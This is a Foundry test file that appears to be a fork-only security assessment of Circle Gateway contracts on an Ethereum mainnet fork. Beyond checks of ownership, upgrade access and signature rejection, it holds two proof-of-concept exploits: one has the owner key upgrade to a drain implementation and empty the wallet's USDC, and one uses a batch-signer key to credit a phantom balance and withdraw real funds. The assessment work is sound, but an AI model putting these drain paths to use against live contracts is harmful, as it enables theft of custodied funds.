// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import {Test} from "forge-std/Test.sol";
import {DrainImpl, IERC20Min} from "../src/DrainImpl.sol";

interface IGateway {
    function owner() external view returns (address);
    function pendingOwner() external view returns (address);
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
    function gatewayMint(bytes calldata attestationPayload, bytes calldata signature) external;
    function submitBatch(bytes calldata calldataBytes, bytes calldata signature) external;
    function gatewayBurn(bytes calldata calldataBytes, bytes calldata signature) external;
    function availableBalance(address token, address depositor) external view returns (uint256);
    function withdrawalDelay() external view returns (uint256);
    function initiateWithdrawal(address token, uint256 value) external;
    function withdraw(address token) external;
}

struct BatchedDelta {
    address depositor;
    int256 value;
}

/// @title CircleGatewayTest
/// @notice Fork-only assessment of Circle Gateway (GatewayWallet `0x7777…` / GatewayMinter `0x2222…`).
///         Every test runs on a local mainnet fork. No mainnet transaction is signed or sent.
contract CircleGatewayTest is Test {
    address constant MINTER = 0x2222222d7164433c4C09B0b0D809a9b52C04C205;
    address constant WALLET = 0x77777777Dcc4d5A8B6E418Fd04D8997ef11000eE;
    address constant OWNER_MINTER = 0x3c54FFa14d01EF3A555106007A4fED6E8964aAB6; // EOA (code 0)
    address constant OWNER_WALLET = 0x2A6A86466F181721ec8ff946967b56f1AA4758c5; // EOA (code 0)
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant DEAD_VICTIM = address(0xdEaD);

    bytes32 constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 constant ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
    bytes32 constant INIT_SLOT = 0xf0c57e16840df040f15088dc2f81fe391c3923bec73e23a9662efc9c229c6a00;
    bytes32 constant BATCHES_SLOT = 0x0e6c5e45c8a8c20a4b7640db1ad9d6bc08eb78e01fa319b166e7a60871192000;

    // selectors
    bytes4 constant SEL_OWNABLE_UNAUTH = 0x118cdaa7; // OwnableUnauthorizedAccount(address)
    bytes4 constant SEL_ECDSA_LEN = 0xfce698f7; // ECDSAInvalidSignatureLength(uint256)
    bytes4 constant SEL_INVALID_ATTESTATION_SIGNER = 0x127a982d; // InvalidAttestationSigner()
    bytes4 constant SEL_INVALID_BATCH_SIGNER = 0x5c6b57b5; // InvalidBatchSigner()
    bytes4 constant SEL_UUPS_CTX = 0xe07c8dba; // UUPSUnauthorizedCallContext()

    uint256 forkBlock;

    function setUp() public {
        string memory rpc = vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
        vm.createSelectFork(rpc);
        forkBlock = block.number;
        emit log_named_uint("fork block", forkBlock);
    }

    function _retSel(bytes memory ret) internal pure returns (bytes4 s) {
        if (ret.length >= 4) {
            assembly {
                s := mload(add(ret, 0x20))
            }
        }
    }

    // ---------------------------------------------------------------------------------------------
    // Live state
    // ---------------------------------------------------------------------------------------------

    function test_live_ownership_and_upgrade_surface() public {
        // owners are EOAs
        assertEq(IGateway(MINTER).owner(), OWNER_MINTER, "minter owner");
        assertEq(IGateway(WALLET).owner(), OWNER_WALLET, "wallet owner");
        assertEq(OWNER_MINTER.code.length, 0, "minter owner must be an EOA");
        assertEq(OWNER_WALLET.code.length, 0, "wallet owner must be an EOA");
        assertEq(IGateway(MINTER).pendingOwner(), address(0), "no pending minter owner");
        assertEq(IGateway(WALLET).pendingOwner(), address(0), "no pending wallet owner");

        // no ProxyAdmin: EIP-1967 admin slot is zero => upgrades go through owner-only UUPS path
        assertEq(vm.load(MINTER, ADMIN_SLOT), bytes32(0), "minter admin slot");
        assertEq(vm.load(WALLET, ADMIN_SLOT), bytes32(0), "wallet admin slot");

        // current implementations
        assertEq(
            uint256(vm.load(MINTER, IMPL_SLOT)),
            uint256(uint160(0xc2ff68068362AEa1ca22a3896d05B2B812ce51B1)),
            "minter impl"
        );
        assertEq(
            uint256(vm.load(WALLET, IMPL_SLOT)),
            uint256(uint160(0xF7a6D9D7Df917c072ac8987A820c58aA27A0e798)),
            "wallet impl"
        );

        // reinitializer(2) already consumed -> no initialize() front-run
        assertEq(uint256(vm.load(MINTER, INIT_SLOT)), 2, "minter init slot");
        assertEq(uint256(vm.load(WALLET, INIT_SLOT)), 2, "wallet init slot");

        // live USDC custodied by the wallet
        uint256 bal = IERC20Min(USDC).balanceOf(WALLET);
        emit log_named_decimal_uint("USDC in GatewayWallet", bal, 6);
        assertGt(bal, 60_000_000e6, "wallet should hold >$60M USDC");
    }

    function test_upgrade_is_owner_only() public {
        address attacker = address(0xBEEF);
        vm.prank(attacker);
        (bool ok, bytes memory ret) =
            MINTER.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(0xdead), bytes("")));
        assertFalse(ok, "non-owner upgrade must revert");
        assertEq(_retSel(ret), SEL_OWNABLE_UNAUTH, "OwnableUnauthorizedAccount");

        vm.prank(attacker);
        (ok, ret) = WALLET.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(0xdead), bytes("")));
        assertFalse(ok, "non-owner upgrade must revert");
        assertEq(_retSel(ret), SEL_OWNABLE_UNAUTH, "OwnableUnauthorizedAccount");
    }

    // ---------------------------------------------------------------------------------------------
    // Inbound auth is tight: forged / unsigned payloads are rejected before any state change
    // ---------------------------------------------------------------------------------------------

    function test_inbound_rejects_junk_signatures() public {
        bytes memory junk = hex"deadbeef";
        (bool ok, bytes memory ret) = MINTER.call(abi.encodeWithSignature("gatewayMint(bytes,bytes)", junk, junk));
        assertFalse(ok, "gatewayMint(junk) must revert");
        assertEq(_retSel(ret), SEL_ECDSA_LEN, "ECDSAInvalidSignatureLength");

        (ok, ret) = WALLET.call(abi.encodeWithSignature("submitBatch(bytes,bytes)", junk, junk));
        assertFalse(ok, "submitBatch(junk) must revert");
        assertEq(_retSel(ret), SEL_ECDSA_LEN, "ECDSAInvalidSignatureLength");

        (ok, ret) = WALLET.call(abi.encodeWithSignature("gatewayBurn(bytes,bytes)", junk, junk));
        assertFalse(ok, "gatewayBurn(junk) must revert");
        assertEq(_retSel(ret), SEL_ECDSA_LEN, "ECDSAInvalidSignatureLength");
    }

    function test_inbound_rejects_wellformed_sig_from_unauthorized_key() public {
        uint256 pk = 0xA11CE;
        address signer = vm.addr(pk);

        // Attestation payload: arbitrary bytes; signature is a *valid* ECDSA sig but from a non-signer.
        bytes memory payload = hex"ff6fb334deadbeef";
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(payload)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, ethHash);
        (bool ok, bytes memory ret) =
            MINTER.call(abi.encodeWithSignature("gatewayMint(bytes,bytes)", payload, abi.encodePacked(r, s, v)));
        assertFalse(ok, "forged attestation must revert");
        assertEq(_retSel(ret), SEL_INVALID_ATTESTATION_SIGNER, "InvalidAttestationSigner");

        // Well-formed batch calldata, correctly signed, but by a key that is not a batch signer.
        BatchedDelta[] memory deltas = new BatchedDelta[](2);
        deltas[0] = BatchedDelta({depositor: signer, value: int256(1_000_000e6)});
        deltas[1] = BatchedDelta({depositor: DEAD_VICTIM, value: -int256(1_000_000e6)});
        bytes memory batchBytes = abi.encode(deltas, bytes32(uint256(1)), uint32(0), USDC, WALLET);
        bytes32 bh = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(batchBytes)));
        (v, r, s) = vm.sign(pk, bh);
        (ok, ret) = WALLET.call(abi.encodeWithSignature("submitBatch(bytes,bytes)", batchBytes, abi.encodePacked(r, s, v)));
        assertFalse(ok, "forged batch must revert");
        assertEq(_retSel(ret), SEL_INVALID_BATCH_SIGNER, "InvalidBatchSigner");
    }

    // ---------------------------------------------------------------------------------------------
    // P1 — single-EOA owner can upgrade the implementation and drain the wallet (Drift-class)
    // ---------------------------------------------------------------------------------------------

    function test_P1_owner_upgrade_drain() public {
        uint256 before = IERC20Min(USDC).balanceOf(WALLET);
        assertGt(before, 0, "wallet must hold funds");

        DrainImpl impl = new DrainImpl();
        vm.prank(OWNER_WALLET); // single EOA key — no timelock, no multisig, no delay
        IGateway(WALLET).upgradeToAndCall(address(impl), "");

        assertEq(uint256(vm.load(WALLET, IMPL_SLOT)), uint256(uint160(address(impl))), "impl swapped");

        vm.prank(OWNER_WALLET);
        DrainImpl(WALLET).drain(USDC, OWNER_WALLET);

        uint256 afterBal = IERC20Min(USDC).balanceOf(WALLET);
        emit log_named_decimal_uint("drained USDC (fork)", before - afterBal, 6);
        assertEq(afterBal, 0, "wallet fully drained");
        assertEq(IERC20Min(USDC).balanceOf(OWNER_WALLET), before, "owner received all USDC");
    }

    // ---------------------------------------------------------------------------------------------
    // P2 — batch-signer key compromise mints credit against a phantom debit and withdraws real USDC
    // ---------------------------------------------------------------------------------------------

    function test_P2_batch_signer_mint_and_withdraw() public {
        uint256 pk = 0xB0B;
        address signer = vm.addr(pk);

        // Simulate possession of a batchSigner key by registering our address in BatchesStorage.
        bytes32 base = keccak256(abi.encode(signer, BATCHES_SLOT));
        vm.store(WALLET, base, bytes32(uint256(1))); // isBatchSigner[signer] = true

        uint256 X = 60_000_000e6;
        BatchedDelta[] memory deltas = new BatchedDelta[](2);
        deltas[0] = BatchedDelta({depositor: signer, value: int256(X)}); // credit (no validation)
        deltas[1] = BatchedDelta({depositor: DEAD_VICTIM, value: -int256(X)}); // phantom debit, clamps to 0
        bytes memory batchBytes = abi.encode(deltas, bytes32(uint256(0xC1)), uint32(0), USDC, WALLET);
        bytes32 bh = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(batchBytes)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, bh);

        vm.prank(address(0xF00D));
        IGateway(WALLET).submitBatch(batchBytes, abi.encodePacked(r, s, v));

        assertEq(IGateway(WALLET).availableBalance(USDC, signer), X, "attacker credited");

        uint256 delay = IGateway(WALLET).withdrawalDelay();
        vm.startPrank(signer);
        IGateway(WALLET).initiateWithdrawal(USDC, X);
        vm.roll(block.number + delay + 1);
        IGateway(WALLET).withdraw(USDC);
        vm.stopPrank();

        emit log_named_decimal_uint("withdrawn USDC (fork)", IERC20Min(USDC).balanceOf(signer), 6);
        assertEq(IERC20Min(USDC).balanceOf(signer), X, "attacker withdrew real USDC");
    }
}
